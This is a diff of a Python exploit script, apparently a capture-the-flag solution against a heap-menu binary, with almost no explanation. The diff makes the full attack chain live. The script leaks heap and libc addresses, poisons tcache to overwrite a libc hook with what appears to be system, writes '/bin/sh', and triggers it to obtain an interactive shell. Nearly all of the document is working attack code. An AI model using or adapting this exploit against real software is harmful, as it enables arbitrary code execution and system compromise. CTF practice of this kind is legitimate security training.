@@ -108,83 +108,73 @@ def chal(rd = 0x100,r=b"0.70",new_rd = b"0"):
         sla("text:\n",str(res).encode())
     sla(": \n",r)
     sla(": \n",new_rd)
-        
 add  = key_add
 free = key_del
 show = key_show
 edit = key_edit
-context.log_level='debug'
+def exp():
+    chal()
 
-chal()
-for x in range(0x1f):
-   add(x,0x2,b"AA")
+    for x in range(0x1f):
+        add(x,0x2,b"AA")
 
-encode(0,b"A"*0x108,0x108)
-
-chal(0x0,b"0.33")
-
-
-# edit a key, whoes length is modified but it's ptr should not be corrupted
-cmd(0)
-
-cmd(2)
-ct = 0 
-klen =""
-while(1):
-    ru("], len = ")
-    klen = p.readline()
-    if(klen!=b'2 \n'):
-        ct+=1
-        continue
-    
-    break
-if(ct==0):
-    p.close()
-    exit(1)
-cmd(4)
-context.log_level='WARNING'
-
-encode(30,b"A"*0xf00,0xf00)
-free(ct) # in tcache
-free(ct+1) # in tcache
-
-
-# context.log_level='debug'
-cmd(0)
-cmd(3)
-sla(": ",str(ct-1).encode())
-ru("Old key:\n")
-val = 0 
-
-heap = 0 
-while(1):
-    val = u64(p.read(8))
-    log.info(hex(val))
-    if( heap==0 ):
-        if((val>>40)==0x55 or (val>>40)==0x56):
-            heap = val
-    if((val>>40)==0x7f):
+    encode(0,b"A"*0x108,0x108)
+    chal(0x0,b"0.33")
+    cmd(0)
+    cmd(2)
+    ct = 0 
+    klen =""
+    while(1):
+        ru("], len = ")
+        klen = p.readline()
+        if(klen!=b'2 \n'):
+            ct+=1
+            continue
         break
-base = val -(0x7ffff7fb1be0-0x7ffff7dc6000)
-log.warning(hex(base))#
-log.warning(hex(heap))#
+    if(ct==0):
+        p.close()
+        exit(1)
+    cmd(4)
+    encode(30,b"A"*0xf00,0xf00) # unsorted bin
 
+    free(ct) # in tcache[0]
+    free(ct+1) # in tcache[0]
 
-input()
-gdb.attach(p,'b readn')
-# context.log_level='debug'
+    cmd(0)
+    cmd(3)
+    sla(": ",str(ct-1).encode())
+    ru("Old key:\n")
+    val = 0 
+    heap = 0 
+    while(1):
+        val = u64(p.read(8))
+        # log.info(hex(val))
+        if( heap==0 ):
+            if((val>>40)==0x55 or (val>>40)==0x56):
+                heap = val
+        if((val>>40)==0x7f):
+            break
+    base = val -(0x7ffff7fb1be0-0x7ffff7dc6000)
+    log.warning(hex(base))
+    log.warning(hex(heap))
+    # input()
+    pay = b'\0'*0x40+flat([0x1eeb20+base])
+    sa(": ",pay)
+    cmd(4)
+    add(ct,0x10,b"A"*0x10)
+    # context.log_level='debug'
+    cmd(0)
+    cmd(0)
+    sla(": ",str(ct+1).encode())
+    sla(": ",str(0x10).encode())
+    sa(": ",b"/bin/sh\0"+p64(0x55410+base))
+    cmd(1)
+    sla(": ",str(ct+1).encode())
+    # gdb.attach(p,'b readn')
+    p.interactive()
 
-# pay = b'\0'*0x80+flat([heap+0x40,0,0,0x21,0x1eeb20+base])
-# sa(": ",pay)
-# cmd(4)
-# add(ct,0x10,b"A"*0x10)
-
-# cmd(0)
-# cmd(0)
-# sla(": ",str(ct+1).encode())
-# sla(": ",str(0x10).encode())
-# sa(": ",b"/bin/sh\0"+p64(0x55410+base))
-
-
-
-p.interactive()
+if __name__ == "__main__":
+    try:
+        exp()
+    except:
+        p.close()
